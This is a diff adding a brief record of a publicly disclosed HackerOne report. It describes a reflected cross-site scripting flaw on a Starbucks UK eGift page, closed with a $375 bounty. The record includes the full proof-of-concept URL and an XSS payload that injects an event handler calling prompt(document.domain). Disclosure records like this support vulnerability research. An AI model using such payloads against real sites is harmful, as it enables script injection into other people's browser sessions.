@@ -1,0 +1,14 @@
+ReportLink:https://hackerone.com/reports/140616
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/meals
+ReportedTo:Starbucks(starbucks)
+BountyAmount:375.0
+Severity:
+State:Closed
+DateOfDisclosure:19.12.2016 22:48:31
+
+Summary:
+
+https://www.starbucks.co.uk/shop/card/egift?utm_campaign=egift&utm_content=WinterFY16&utm_medium=GPH&utm_source=SBUXcouk"%3e%3cb%20onbeforescriptexecute=prompt(document.domain)%3e
+
+Payload: "%3e%3cb%20onbeforescriptexecute=prompt(document.domain)%3e
